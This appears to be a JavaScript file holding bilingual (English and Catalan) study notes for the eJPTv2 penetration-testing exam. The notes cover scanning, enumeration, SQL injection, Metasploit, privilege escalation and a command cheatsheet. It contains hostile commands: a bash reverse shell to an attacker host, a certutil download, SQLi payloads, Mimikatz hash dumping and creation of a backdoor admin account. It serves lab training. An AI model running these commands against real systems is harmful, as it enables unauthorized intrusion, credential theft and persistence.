*Translation*: "Scan EVERYTHING very fast". We want to know which ports are open NOW.

**Step 3: The Detailed Scan (Service & Scripts)**
\`\`\`bash
nmap -sC -sV -p 22,80,445 192.168.1.100 -oA detailed_scan
\`\`\`
*Translation*: "Okay, I found 22, 80, and 445. Now tell me WHAT versions are running and run the default scripts on them".
- \`-sC\`: Default scripts (vital, finds anonymous logins, web titles, etc.).
- \`-sV\`: Versions (to look for exploits later).
- \`-oA\`: **ALWAYS SAVE THE OUTPUT**. If it's not documented, it didn't happen.

> **💡 Pro Tip: Specific Scripts**
> Don't stick only to \`-sC\`. Use specific scripts for what you find:
> - **SMB**: \`nmap -p 445 --script smb-os-discovery,smb-enum-shares,smb-enum-users IP\`
> - **HTTP**: \`nmap -p 80 --script http-enum,http-title,http-headers IP\`
> - **Vulns**: \`nmap --script vuln IP\` (Careful, it's noisy and can take time).

#### Traffic Analysis: Wireshark
Sometimes, the answer is not on the server, but on the wire.
- **Basic Filters**:
    - \`ip.addr == 192.168.1.50\`: Only traffic from that IP.
    - \`tcp.port == 80\`: Only web traffic.
    - \`http.request.method == "POST"\`: Look for credentials sent in forms.

---

### 2.4 Service Enumeration: Digging Deeper

Nmap tells you "The door is open". Now it's time to go in and look at the furniture.

#### SMB (Port 445/139) - The Treasure
If you see this on Windows, **it's your #1 priority**.
- **Tool**: \`enum4linux -a IP\`
- **What you look for**:
    - **Null Sessions**: Can you enter without a user or password?
    - **Shares**: Are there shared folders named "Backup", "Passwords", or "Private"?
    - **Users**: List of users for brute force.

#### HTTP/HTTPS (Port 80/443) - The Jungle
The web is huge. Don't get lost surfing aimlessly.
1.  **Technologies**: \`whatweb http://IP\` -> Is it a WordPress? An old Apache?
2.  **Hidden Directories**: \`gobuster dir -u http://IP -w common.txt\` -> Look for \`/admin\`, \`/backup\`, \`/config\`.
    - *Pro Tip*: Always look for extensions: \`-x php,txt,html\`. Sometimes \`config.php.bak\` is the key to the kingdom.

#### Other Usual Suspects
- **FTP (21)**: Always try user \`anonymous\` and empty password.
- **SSH (22)**: Rarely vulnerable to exploits. Try brute force (Hydra) if you have users, or look for stolen private keys.
- **SQL (3306/1433)**: Open to the outside? Try default credentials (\`root:root\`, \`sa:password\`).

---

### 2.5 Summary

1.  **Don't rush**. Take your time enumerating.
2.  **Document**. Note every port, every version, and every weird thing you see.
3.  **Organize**. If you find a user in SMB, try it in SSH and in the Web Login. Everything is connected.

### 2.6 Enumeration Checklist (Don't miss anything)
- [ ] **Ping Sweep**: Do I have all the IPs?
- [ ] **Full Nmap**: Have I scanned all 65535 TCP ports? And the top 20 UDP?
- [ ] **Versions**: Do I know what software runs on each port?
- [ ] **Scripts**: Have I run \`--script vuln\` or specific scripts (smb, http)?
- [ ] **Web**: Have I looked for hidden directories, subdomains, and technologies?
- [ ] **SMB**: Have I tried null sessions and listed shares?

### 2.7 Troubleshooting: Why don't I see anything?
- **Host not responding?**: Try \`-Pn\` (treat as online) or \`-PE\` (ICMP echo).
- **Scan too slow?**: Use \`--min-rate 5000\`.
- **Weird results?**: There might be a Firewall/WAF. Try fragmenting packets (\`-f\`) or changing the MTU (\`--mtu 24\`).

[⬆️ Back to Top](README.md)`;

notesData.en["part3.md"] = `## Part 3: Exploitation Techniques

### 3.1 Entering the System

You have enumerated. You know there is a vulnerable Apache web server or a Windows with open SMB. Now it's time to **break the door**.

But careful: **Don't launch exploits wildly**. A failed exploit can crash the server (DoS) and alert everyone. Understand what you are going to launch.

---

### 3.2 Web Vulnerabilities: Asking and Executing

Most web attacks boil down to: "The web trusts too much what I write".

#### SQL Injection (SQLi): Interrogating the Database
Imagine the web has a doorman.
- You: "I want to enter".
- Doorman: "User?".
- You: "I am John".
- Doorman: "Come in".

Now SQLi:
- You: "I am John **OR** I am anyone if 1 equals 1".
- Doorman (Confused database): "Ah, 1 equals 1... well come in".

**Tools**:
- **Manual**: Always try \`' OR 1=1--\` in logins.
- **Automatic**: \`sqlmap\`. It's black magic.
    - \`sqlmap -u "http://web.com?id=1" --dbs\` -> "Tell me what databases you have".
    - \`sqlmap -u "..." --os-shell\` -> "Give me a terminal on the server". **(The Holy Grail)**.

#### Cross-Site Scripting (XSS): Attacking the User
Here you don't attack the server, you attack **who visits the web**.
- You inject malicious JavaScript code.
- When the admin enters, their browser executes your code.
- **Goal**: Steal their session cookie (\`document.cookie\`). With that cookie, **you are the admin**.

#### File Upload: The Backdoor
If a web lets you upload profile photos... what happens if you upload a malicious \`.php\` file?
- You upload \`shell.php\`.
- You visit \`http://web.com/uploads/shell.php\`.
- Boom! The server executes your code.

---

### 3.3 Metasploit: Your Swiss Army Knife

Many hate Metasploit because they say it's for "script kiddies". **False**. It is a powerful professional tool. Use it, but understand what it does.

**Typical Workflow:**
1.  **Search**: \`search eternalblue\`
2.  **Select**: \`use exploit/windows/smb/...\`
3.  **Configure**:
    - \`set RHOSTS VICTIM_IP\` (Who you attack)
    - \`set LHOST YOUR_IP\` (Where the connection comes back - **IMPORTANT**)
4.  **Fire**: \`exploit\`

> **⚠️ Note**: If Metasploit fails, read the error. Sometimes it's as simple as changing the \`LHOST\` or the \`TARGET\`.

#### Payloads: What do I send?
Not all payloads are the same.
- **Staged** (\`windows/meterpreter/reverse_tcp\`): Sends a small chunk first, which then downloads the rest. Less stable but fits in small places.
- **Non-Staged** (\`windows/meterpreter_reverse_tcp\`): Sends EVERYTHING at once. More stable and secure, but heavier. **Use it if staged fails**.

#### Pivoting: Jumping from machine to machine
In the exam, sometimes you compromise a machine (A) that has access to an internal network (B) that you don't see.
1.  **Autoroute**: In Meterpreter, use \`run autoroute -s 10.0.0.0/24\`. Now MSF "sees" that network.
2.  **Proxychains**:
    - Use the module \`auxiliary/server/socks_proxy\`.
    - Configure \`/etc/proxychains.conf\` with the proxy port.
    - Run tools outside MSF: \`proxychains nmap ...\`

---

### 3.4 Shells: The Art of Connecting

When you exploit something, you want control. You want a **Shell**.

**Reverse Shell (The most common)**
You wait (listen) and force the victim to connect to you. Ideal for bypassing Firewalls (which usually block incoming connections but allow outgoing ones).
1.  You: \`nc -lvnp 4444\` (I listen on port 4444).
2.  Victim: Executes code that says "Connect to the attacker's IP on port 4444 and give them a terminal".

**Bind Shell**
The victim opens a port and you connect to it. Less common because Firewalls usually block it.

**Stabilize your Shell (Vital)**
When you get a shell with Netcat, it's "dumb". It has no history, no autocomplete, and if you do Ctrl+C it dies.
**The Trick**:
\`\`\`bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
\`\`\`
(Then Ctrl+Z, \`stty raw -echo; fg\`, Enter, Enter). Now you have a real terminal!

---

### 3.5 Summary

Exploitation is not magic. It's finding a piece of poorly made software and using it to do what you want.
- **Web**: SQLi, XSS, Uploads.
- **Network**: Known Exploits (EternalBlue), Brute Force.
- **Final Goal**: Get a Shell (command line access).

Once inside... the real fun begins (Post-Exploitation).

### 3.6 Exploitation Checklist
- [ ] **Research**: Have I searched for the exact exploit for the exact version?
- [ ] **Configuration**: Have I checked LHOST, RHOST, and LPORT three times?
- [ ] **Payload**: Have I tried Staged and Non-Staged?
- [ ] **Architecture**: Am I launching an x64 payload to an x86 Windows? (Common mistake).

### 3.7 Troubleshooting: Metasploit fails
- **"Exploit completed, but no session was created"**:
    - Your exploit worked, but the payload couldn't connect back.
    - Cause 1: Firewall blocks incoming connection -> Use a common port (80, 443).
    - Cause 2: Incorrect Payload (x64 vs x86).
    - Cause 3: Victim has no internet access (rare in exam, possible in real life).
- **"Connection refused"**:
    - The service is down or the port is closed.
    - Did you crash the service with a previous attempt? Restart the machine if you can.

[⬆️ Back to Top](README.md)`;

notesData.en["part4.md"] = `## Part 4: Post-Exploitation & Privilege Escalation

### 4.1 I'm in... now what?

Congratulations, you have a shell. But you are probably \`www-data\` or a user without powers. You can't read \`/etc/shadow\`, you can't dump hashes, and you can't install tools.

**Your mission now is to become God (Root/SYSTEM).**

---

### 4.2 Linux Escalation: Looking for Human Error

In Linux, you rarely escalate via a "magic kernel exploit" (although it happens, like DirtyCow). Usually you escalate because **the administrator made a mistake**.

#### 1. Sudo: The most common error
The first thing I type in any new shell:
\`\`\`bash
sudo -l
\`\`\`
If you see \`(ALL) NOPASSWD: /usr/bin/vim\`, you are already root!
- **Why?** Because Vim lets you execute system commands.
- **Trick**: Visit [GTFOBins](https://gtfobins.github.io/). It's the bible for this. Search "vim", click "Sudo", and copy the command.

#### 2. SUID: Dangerous permissions
SUID files run with the permissions of their *owner* (usually root), not the *user* who runs them.
- **Search Command**:
  \`\`\`bash
  find / -perm -4000 -type f 2>/dev/null
  \`\`\`
- If you see \`/usr/bin/python\` with SUID... congratulations. You can make Python generate a root shell.

#### 3. Cron Tasks: The forgotten script
Sometimes there are scripts that run every minute as root. If you can *write* to that script... you can put your malicious code and wait a minute.
- **Command**: \`cat /etc/crontab\` or use **LinPEAS**.

#### Star Tool: LinPEAS
Don't waste time searching by hand.
1.  Upload \`linpeas.sh\` to the victim.
2.  Run it: \`./linpeas.sh\`.
3.  Look at the colors: **Red/Yellow** = 99% chance of escalation.

#### Manual Enumeration (Living off the Land)
Sometimes you can't upload tools. Learn to look yourself:
- \`uname -a\`: Kernel version (DirtyCow?).
- \`cat /etc/passwd\`: System users.
- \`id\`: Who are you and what groups are you in? (lxd, docker are dangerous).
- \`history\`: Did the admin type passwords before?
- \`netstat -antup\`: What is running internally?

---

### 4.3 Windows Escalation: The Maze

Windows is more complex and noisy. Here we look for misconfigured services.

#### 1. Unquoted Service Paths (The Classic)
A service runs in \`C:\\Program Files\\My Program\\service.exe\`.
Note there are spaces and no quotes. Windows will try to execute:
1.  \`C:\\Program.exe\` (If you put a virus here, it runs as SYSTEM!)
2.  \`C:\\Program Files\\My.exe\`
3.  ...

#### 2. AlwaysInstallElevated
A policy that allows ANY user to install \`.msi\` files as SYSTEM.
- **Attack**: You create a malicious MSI with \`msfvenom\` and install it. Boom, SYSTEM shell.

#### 3. Secrets in the dust
Admins are lazy. They leave passwords in:
- Installation scripts (\`Unattend.xml\`).
- PowerShell history.
- Web configuration files (\`web.config\`).

#### Star Tool: WinPEAS
Same as in Linux. Download \`winpeas.exe\`, run it, and look for red.

#### Manual Enumeration in Windows
- \`whoami /priv\`: Do you have \`SeImpersonatePrivilege\`? (JuicyPotato).
- \`net user\`: List users.
- \`net localgroup Administrators\`: Who is admin?
- \`ipconfig /all\`: What network are you in? Who is the DNS?
- \`cmdkey /list\`: Are there saved credentials?

---

### 4.4 Looting and Persistence

Once you are Root/SYSTEM, the game isn't over.
1.  **Dump Hashes**:
    - Linux: \`cat /etc/shadow\`
    - Windows: Mimikatz or \`hashdump\` in Meterpreter.

2.  **Persistence**:
    - Do you want to have to exploit the flaw again tomorrow? No.
    - Create a new user: \`net user hacker password123 /add\` and \`net localgroup Administrators hacker /add\`.
    - Or leave a scheduled task that sends you a shell every hour.

---

### 4.5 Summary

Privilege escalation is an art of **internal enumeration**.
- Don't look for complex exploits at first.
- Look for **configuration errors** (weak permissions, plain text passwords).
- Use enumeration scripts (**LinPEAS/WinPEAS**) to save time, but **understand what they tell you**.

### 4.6 PrivEsc Checklist
- [ ] **Linux**:
    - [ ] \`sudo -l\`
    - [ ] SUID binaries (\`find / -perm -4000\`)
    - [ ] Crontabs (\`/etc/crontab\`)
    - [ ] Kernel Version (\`uname -a\`)
    - [ ] LinPEAS (Anything red?)
- [ ] **Windows**:
    - [ ] \`whoami /priv\` (SeImpersonate?)
    - [ ] Unquoted Service Paths
    - [ ] AlwaysInstallElevated
    - [ ] WinPEAS (Anything red?)

[⬆️ Back to Top](README.md)`;

notesData.en["part5.md"] = `## Part 5: Your Tool Arsenal

### 5.1 Don't be a "Tool Kiddie"

A "Tool Kiddie" launches tools without knowing what they do. A Hacker knows which tool to use, when, and with what flags.

Here is my personal selection for eJPTv2, organized by function.

---

### 5.2 Scanning and Enumeration

**Nmap (The King)**
- **Use**: Everything. Discovery, ports, services, scripts.
- **Pro Tip**: Always use \`-oA\`. If Nmap takes too long, use \`--min-rate 2000\`, but be careful about saturating the network.

**Masscan / Rustscan**
- **Use**: When you are in a hurry or have many IPs. They are much faster than Nmap but less precise.
- **Strategy**: Use Masscan to find open ports fast, and then Nmap ONLY to those ports to see versions.

**Gobuster / Ffuf**
- **Use**: Brute force of web directories and subdomains.
- **Pro Tip**: The wordlist matters more than the tool. Use \`directory-list-2.3-medium.txt\` from SecLists. It's the old reliable.

---

### 5.3 Brute Force and Cracking

**Hydra**
- **Use**: Guessing passwords on live services (SSH, FTP, RDP, Web Login).
- **Careful**: It's noisy and slow. Use it only if you have a valid user and want the password.

**John the Ripper / Hashcat**
- **Use**: Cracking hashes you have already stolen (offline).
- **Difference**:
    - **John**: Easy to use, detects formats automatically. Good for CPU.
    - **Hashcat**: The beast. Hard to learn, but if you have a graphics card (GPU), it flies.

---

### 5.4 Exploitation and Shells

**Metasploit Framework (MSF)**
- **Use**: All in one. Exploits, payloads, listeners, post-exploitation.
- **Pro Tip**: Use \`workspaces\` inside msfconsole to organize your IPs if you attack multiple machines.

**Netcat (nc)**
- **Use**: The Swiss Army knife. Transfer files, simple chat, manual port scanning, and above all, **Reverse Shells**.
- **Life or death command**: \`nc -lvnp 4444\`. Tattoo it.

**Burp Suite**
- **Use**: Intercept and modify web traffic.
- **Essential for**: Manual SQLi, seeing hidden parameters, repeating requests (Repeater). The Community version is enough for eJPT.

---

### 5.5 Post-Exploitation

**LinPEAS / WinPEAS**
- **Use**: Scripts that look for privilege escalation vectors automatically.
- **Advice**: The output is huge. Learn to read it. Red/yellow is what matters. Ignore the noise.

**Mimikatz**
- **Use**: Extract plain text passwords and hashes from Windows memory.
- **Danger**: Antiviruses hate it. In eJPTv2 there is no AV, so enjoy.

---

### 5.6 Summary

You don't need 100 tools. You need to master these 10.
- **Network**: Nmap, Netcat.
- **Web**: Gobuster, Burp Suite.
- **Attack**: Metasploit, Hydra.
- **Post**: PEAS, John/Hashcat.

With this, you can hack almost anything at the Junior/Mid level.

[⬆️ Back to Top](README.md)`;

notesData.en["part6.md"] = `## Part 6: Recommended Labs
 
 ### 6.1 Practice Makes Perfect
 
 Instead of giving you step-by-step solutions that you will copy without thinking, I am going to recommend **Real Labs** (mostly free) that perfectly simulate the eJPTv2 environment.
 
 Your mission: **Hack them without looking at writeups** (at least try for 1 hour).
 
 ---
 
 ### 6.2 Level 1: Warm-up (TryHackMe)
 
 #### [Blue](https://tryhackme.com/room/blue)
 - **Goal**: Exploit the most famous vulnerability in history (EternalBlue).
 - **Skills**: Nmap scripting, Metasploit, Windows.
 - **Challenge**: Try to do it manually (without Metasploit) after doing it with MSF.
 
 #### [Ice](https://tryhackme.com/room/ice)
 - **Goal**: Exploit a misconfigured service on Windows.
 - **Skills**: RDP, Metasploit, Basic Privilege Escalation.
 
 ---
 
 ### 6.3 Level 2: Reality (TryHackMe)
 
 #### [Blaster](https://tryhackme.com/room/blaster)
 - **Goal**: A modern Windows environment with IIS.
 - **Skills**: Web enumeration, Metasploit, Persistence.
 
 #### [Ignite](https://tryhackme.com/room/ignite)
 - **Goal**: A vulnerable CMS (Fuel CMS).
 - **Skills**: Searchsploit, Manual RCE, Linux PrivEsc.
 
 ---
 
 ### 6.4 Level 3: Exam Simulation
 
 #### [Wreath](https://tryhackme.com/room/wreath) (Full Network)
 - **Goal**: This is the closest thing to eJPTv2. A network with multiple machines, pivoting, and lateral movement.
 - **Skills**: Pivoting (Sshuttle/Proxychains), Evasion, Complex Escalation.
 - **Note**: It's long, but worth gold.
 
 [⬆️ Back to Top](README.md)`;

notesData.en["part7.md"] = `## Part 7: Surviving the eJPTv2 Exam

### 7.1 It's not an Exam, it's a Job

The eJPTv2 doesn't ask you to answer A, B, or C. It gives you a hiring letter: "Here is a corporate network. Hack it and tell me what you found".

You have **48 hours**. It's plenty of time. Don't panic.

---

### 7.2 Combat Strategy

#### Phase 1: Mapping (Hours 0-2)
Don't attack anything. Just look.
- Launch a Ping Sweep to see all machines.
- Make a diagram (pen and paper). "IP .10 is the web server, .20 looks like a domain controller".
- **Goal**: Understand the network.

#### Phase 2: Deep Enumeration (Hours 2-10)
Choose the easiest machine (usually the one with the most open ports or old web services).
- Enumerate to death.
- Take notes of EVERYTHING. "Port 80: Apache 2.4. Port 445: Windows 10".

#### Phase 3: The Attack (Hours 10-...)
- Did you find an exploit for that Apache version? Launch it.
- Did you find users in SMB? Brute force SSH.
- If you get stuck for more than 1 hour on a machine, **switch to another**. Sometimes you need information from Machine B to hack Machine A.

---

### 7.3 Psychological Tips

1.  **Enumeration is Key**: If you don't find the vulnerability, it's because you haven't enumerated well. Scan again. Look for UDP ports. Look in all ports (1-65535).
2.  **Rest**: Your brain doesn't work well after 8 hours straight. Sleep. Eat. Go for a walk. The exam lasts 2 days.
3.  **Metasploit is your Friend**: Use it. You don't get extra points for doing it "by hand". If there is a Metasploit module, use it.
4.  **Questions are Clues**: Read the exam questions. Sometimes they ask "What is the content of the secret.txt file on Administrator's desktop?". They are telling you the goal is to get to Administrator's desktop!

---

### 7.4 What NOT to do

- **Don't give up**. If you get blocked, breathe.
- **Don't complicate things**. The solution is usually simple. Don't look for a kernel 0-day if the admin password is "admin123".
- **Don't forget screenshots**. You need proof.

[⬆️ Back to Top](README.md)`;

notesData.en["part8.md"] = `## Part 8: Resources and Farewell

### 8.1 Your Travel Backpack

Don't go alone. Here are the resources I use day to day.

**Technical References (The Bible)**
- **[HackTricks](https://book.hacktricks.xyz/)**: If there is a way to hack it, it's here. It's your #1 reference.
- **[GTFOBins](https://gtfobins.github.io/)**: For privilege escalation in Linux.
- **[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)**: Cheatsheets for everything (SQLi, XSS, Reverse Shells).

**Training (The Gym)**
- **TryHackMe**: Start here. Guided paths. "Jr Penetration Tester" is pure gold.
- **HackTheBox**: When you feel brave. More real and difficult machines.

**Tools (The Workshop)**
- **SecLists**: The best collection of dictionaries (users, passwords, web paths). \`apt install seclists\`.

---

### 8.2 A Final Message

Getting here shows you have the necessary curiosity and discipline. Hacking is not for people who give up at the first error. It's for people who see an error and say "Why did this happen?" and keep investigating.

This guide is a summary of my experience. Use it, improve it, and above all, **share it**. Knowledge grows when shared.

Good luck on your exam. See you on the Root side.

**- JotaTito05** 🏴‍☠️

[⬆️ Back to Top](README.md)`;

// -------------------------------------------------------------------------
// CATALAN TRANSLATIONS
// -------------------------------------------------------------------------

notesData.ca["README.md"] = `# Guia d'Estudi eJPTv2

## Taula de Continguts

- [Introducció](#introducció)
- [Com utilitzar aquesta guia](#com-utilitzar-aquesta-guia)
- [Part 1: Fonaments Teòrics](part1.md)
- [Part 2: Reconeixement i Enumeració](part2.md)
- [Part 3: Tècniques d'Explotació](part3.md)
- [Part 4: Post-Explotació i Escalada de Privilegis](part4.md)
- [Part 5: Referència d'Eines](part5.md)
- [Part 6: Exercicis Pràctics](part6.md)
- [Part 7: Preparació per a l'Examen](part7.md)
- [Part 8: Recursos Addicionals](part8.md)
- [Part 9: Cheatsheet](part9.md)

---`;

notesData.ca["part9.md"] = `## Part 9: La Bíblia de l'eJPTv2 (Cheatsheet)

### 9.1 Descobriment de Hosts
#### Passiu (OSINT)
\`\`\`bash
# Google Dorks
site:target.com filetype:pdf

# TheHarvester
theHarvester -d domain.com -b google,bing,crtsh
\`\`\`

#### Actiu (Nmap)
\`\`\`bash
# Ping Sweep
nmap -sn 192.168.1.0/24

# Escaneig Ràpid
nmap -sS --min-rate 5000 -p- IP -oA nmap_fast

# Escaneig Complet
nmap -sC -sV -p 22,80,445 IP -oA nmap_full
\`\`\`

---

### 9.2 Enumeració de Serveis

#### FTP (21)
\`\`\`bash
# Login Anònim
ftp IP # User: anonymous, Pass: anonymous
binary
get arxiu.txt
\`\`\`

#### SMB (139/445)
\`\`\`bash
# Llistar Shares
smbclient -L //IP -N
enum4linux -a IP

# Connectar
smbclient //IP/share -N
\`\`\`

#### Web (80/443)
\`\`\`bash
# Fuzzing
gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt -x php,txt,html

# SQL Injection
sqlmap -u "http://IP/index.php?id=1" --dbs --batch
sqlmap -u "http://IP/index.php?id=1" --os-shell
\`\`\`

---

### 9.3 Explotació

#### Metasploit
\`\`\`bash
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS IP
set LHOST tun0
exploit
\`\`\`

#### Reverse Shells
\`\`\`bash
# Bash
bash -i >& /dev/tcp/IP_ATACANT/4444 0>&1
\`\`\`

#### Estabilitzar Shell
\`\`\`bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
\`\`\`

---

### 9.4 Post-Explotació

#### Transferència d'Arxius
\`\`\`bash
# Servidor Python
python3 -m http.server 80

# Windows
certutil -urlcache -split -f http://IP_ATACANT/file.exe C:\\Windows\\Temp\\file.exe
\`\`\`

#### PrivEsc
\`\`\`bash
# Linux
sudo -l
find / -perm -4000 -type f 2>/dev/null

# Windows
whoami /priv
\`\`\`

[⬆️ Tornar a l'inici](README.md)`;

// Ensure Catalan README is defined
notesData.ca["README.md"] = `# Guia d'Estudi eJPTv2

## Taula de Continguts

- [Introducció](#introducció)
- [Com Utilitzar Aquesta Guia](#com-utilitzar-aquesta-guia)
- [Part 1: Fonaments Teòrics](part1.md)
  - [1.1 Fonaments de Xarxes](part1.md)
  - [1.2 Sistemes Operatius Essencials](part1.md)
  - [1.3 Resum i Recursos](part1.md)
- [Part 2: Reconeixement i Enumeració](part2.md)
- [Part 3: Tècniques d'Explotació](part3.md)
- [Part 4: Post-Explotació i Escalada de Privilegis](part4.md)
- [Part 5: Referència d'Eines](part5.md)
- [Part 6: Exercicis Pràctics](part6.md)
- [Part 7: Preparació per a l'Examen](part7.md)
- [Part 8: Recursos Addicionals](part8.md)
- [Part 9: Cheatsheet](part9.md)

---

## Introducció

Benvingut a la meva Guia d'Estudi eJPTv2! 👋

Sóc **jotatito05** i aquests són els apunts que he creat durant la meva preparació per a l'examen eLearnSecurity Junior Penetration Tester versió 2 (eJPTv2). He decidit compartir-los **voluntàriament i gratuïtament** amb la comunitat perquè crec fermament que el coneixement en ciberseguretat ha de ser accessible per a tothom.

Aquests apunts són el resultat d'hores d'estudi, pràctica i recopilació d'informació de múltiples fonts. Els comparteixo amb l'esperança que t'ajudin en el teu propi camí cap a la certificació eJPTv2, tal com altres recursos em van ajudar a mi.

### Què trobaràs en aquesta guia?

- **Fonaments teòrics sòlids**: Conceptes de xarxes, protocols i sistemes operatius
- **Tècniques pràctiques**: Reconeixement, enumeració, explotació i post-explotació
- **Eines essencials**: Guies detallades de les eines més importants
- **Exercicis complets**: Escenaris pas a pas per practicar
- **Consells per a l'examen**: Estratègies, trucs i errors comuns a evitar
- **Recursos addicionals**: Enllaços a documentació, plataformes de pràctica i comunitats

### Per què comparteixo aquests apunts?

Quan vaig començar a estudiar per a l'eJPTv2, vaig trobar molta informació dispersa i a vegades confusa. Vaig decidir crear els meus propis apunts organitzats i, un cop vaig veure com d'útils eren per a mi, vaig pensar: "Per què no compartir-los amb altres que estan en el mateix camí?"

**La meva filosofia**:
- **Accessible**: Llenguatge clar i explicacions pas a pas (com m'hagués agradat trobar)
- **Pràctic**: Cada concepte ve amb exemples reals que he provat
- **Honest**: Aquests són els meus apunts personals, amb el meu estil i la meva forma d'entendre les coses
- **Col·laboratiu**: Si trobes errors o vols contribuir, ets benvingut!

## Com Utilitzar Aquesta Guia

### Per a principiants

Si ets nou en pentesting, et recomanem seguir la guia en ordre:

1. **Comença amb els fonaments** (Part 1): Assegura't d'entendre bé els conceptes de xarxes i sistemes operatius
2. **Practica amb les eines** (Parts 2-3): Familiaritza't amb les eines bàsiques de reconeixement i enumeració
3. **Avança a tècniques més complexes** (Parts 4-5): Escalada de privilegis i post-explotació
4. **Practica amb exercicis** (Part 6): Aplica tot el que has après en escenaris complets
5. **Prepara't per a l'examen** (Part 7): Revisa consells i estratègies específiques

### Per a usuaris amb experiència

Si ja tens coneixements bàsics:

- Utilitza la **taula de continguts** per navegar directament als temes que necessites reforçar
- Enfoque't en els **exercicis pràctics** (Part 6) per validar els teus coneixements
- Revisa la **referència d'eines** (Part 5) com a cheatsheet ràpid
- Consulta els **consells per a l'examen** (Part 7) per a estratègies específiques de l'eJPTv2

### Consells d'estudi

- **Practica activament**: No només llegeixis, executa les comandes en un entorn de laboratori
- **Pren notes**: Crea el teu propi cheatsheet personalitzat
- **Utilitza plataformes de pràctica**: HackTheBox, TryHackMe, VulnHub
- **Uneix-te a comunitats**: Comparteix dubtes i aprèn d'altres
- **Sigues pacient amb tu mateix**: Tots aprenem al nostre propi ritme

### Convencions de format

Al llarg d'aquesta guia utilitzarem:

**Blocs de codi** per a comandes:
\`\`\`bash
nmap -sV -sC 192.168.1.1
\`\`\`

**Blocs de sortida** per a outputs:
\`\`\`
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.1.1
\`\`\`

**Taules** per a informació estructurada:

| Port | Servei | Descripció |
|------|--------|------------|
| 22   | SSH    | Secure Shell |
| 80   | HTTP   | Web Server   |

**Llistes** per a passos o conceptes relacionats:
- Primer pas
- Segon pas
- Tercer pas

> **Nota important**: Els quadres com aquest ressalten informació clau

> **⚠️ Advertència**: Aquests quadres assenyalen precaucions importants

> **💡 Consell**: Aquests quadres ofereixen trucs i millors pràctiques

### Entorn de pràctica

Per seguir aquesta guia necessitaràs:

- **Sistema operatiu**: Linux (preferiblement Kali Linux o Parrot OS)
- **Màquines virtuals**: VirtualBox o VMware per crear laboratoris
- **Plataformes online**: Comptes a HackTheBox, TryHackMe o similars
- **Eines**: La majoria venen preinstal·lades a Kali Linux

> **💡 Consell**: Si no pots instal·lar Linux, pots utilitzar Windows amb WSL2 (Windows Subsystem for Linux) o una màquina virtual.

### Ètica i legalitat

> **⚠️ IMPORTANT**: Les tècniques descrites en aquests apunts són per a fins educatius i s'han d'utilitzar ÚNICAMENT en:
> - Els teus propis sistemes
> - Entorns de laboratori controlats
> - Plataformes de pràctica autoritzades (HackTheBox, TryHackMe, etc.)
> - Sistemes on tinguis permís explícit per escrit
>
> L'ús no autoritzat d'aquestes tècniques és **il·legal** i pot tenir conseqüències greus. Comparteixo aquest coneixement amb la confiança que l'utilitzaràs de forma ètica i responsable.

### Agraïments i contribucions

Aquests apunts són possibles gràcies a la comunitat de ciberseguretat que comparteix coneixement lliurement. Si trobes útil aquest material:

- ⭐ Dona una estrella al repositori
- 🐛 Reporta errors o suggereix millores
- 🤝 Comparteix-ho amb altres que estiguin estudiant
- 💬 Uneix-te a la comunitat i ajuda a altres

**Crèdits**: Aquests apunts recopilen informació de múltiples fonts públiques, documentació oficial, i la meva experiència personal. Si reconeixes contingut que hauria de ser acreditat específicament, si us plau fes-m'ho saber.

---

Estàs llest per començar el teu viatge cap a la certificació eJPTv2! Recorda: cada expert va ser una vegada un principiant. Amb dedicació i pràctica, tu també pots aconseguir-ho.

**- jotatito05** 🚀`;

notesData.ca["part1.md"] = `## Part 1: Fonaments Teòrics

### 1.1 Introducció: Els Fonaments del Hacker

Abans de llançar el teu primer exploit o escanejar una xarxa, necessites entendre **on estàs trepitjant**. Molts principiants volen saltar-se aquesta part i anar directament a "hackejar", però t'asseguro una cosa: **els millors hackers són, abans de tot, experts en xarxes i sistemes**.

Si no entens com viatja un paquet de dades, no entendràs com interceptar-lo. Si no saps com gestiona Linux els permisos, no sabràs com escalar privilegis.

En aquesta secció, no t'avorriré amb teoria acadèmica inútil. Veurem **el que realment necessites saber** per a l'examen i per a la vida real.

---

### 1.2 Fonaments de Xarxes

#### El Mapa del Territori: Models OSI i TCP/IP

Imagina que la xarxa és un sistema de correu postal. Perquè una carta (dades) arribi de casa teva (origen) a l'oficina (destí), passen moltes coses "invisibles". Els models OSI i TCP/IP són simplement mapes que expliquen aquests passos.

**Per què t'importa això com a pentester?**
Perquè cada atac passa en una "capa" específica. Si entens la capa, entens l'atac.

| Capa | Què passa aquí | Atacs Típics |
|------|----------------|--------------|
| **Aplicació** (7) | El que veus (Navegador, SSH) | SQL Injection, XSS, RCE |
| **Presentació** (6) | Traducció de dades (Formats, Xifratge) | SSL Stripping, Malformed Data |
| **Sessió** (5) | Control de diàleg (Qui parla) | Session Hijacking |
| **Transport** (4) | Com s'envia (TCP/UDP) | Port Scanning, DoS |
| **Xarxa** (3) | On va (IP, Rutes) | IP Spoofing, Man-in-the-Middle |
| **Enllaç** (2) | Connexió física local (MAC) | ARP Poisoning, MAC Flooding |
| **Física** (1) | Cables i senyals (Bits) | Sniffing (físic), Jamming |

> **💡 Concepte Clau**: 
> - **TCP** és com una trucada telefònica: "Hola, em sents?", "Sí, et sento", "D'acord, t'explico...". És fiable.
> - **UDP** és com enviar una carta: La tires a la bústia i esperes que arribi. És ràpid, però no garanteix l'entrega.
> - Per escanejar (Nmap), això és vital. Un escaneig TCP connecta; un escaneig UDP "dispara i escolta".

#### L'Idioma de les Xarxes: Protocols Essencials

Els protocols són els idiomes que parlen les màquines. Com a pentester, ets un traductor (i a vegades, un mentider que es fa passar per qui no és).

Aquí tens els "idiomes" que més trobaràs a l'eJPTv2:

**1. La Web (HTTP/HTTPS)**
- **Ports**: 80 (HTTP), 443 (HTTPS)
- **El teu objectiu**: Buscar panells de login, directoris ocults, configuracions per defecte.
- **Ull**: HTTPS xifra el trànsit, però NO protegeix el servidor d'atacs web (SQLi, XSS segueixen funcionant igual).

**2. Transferència d'Arxius (FTP/TFTP)**
- **Ports**: 21 (FTP), 69 (TFTP)
- **El clàssic**: "Anonymous Login". Moltes vegades els admins obliden tancar l'accés anònim. Prova-ho sempre!
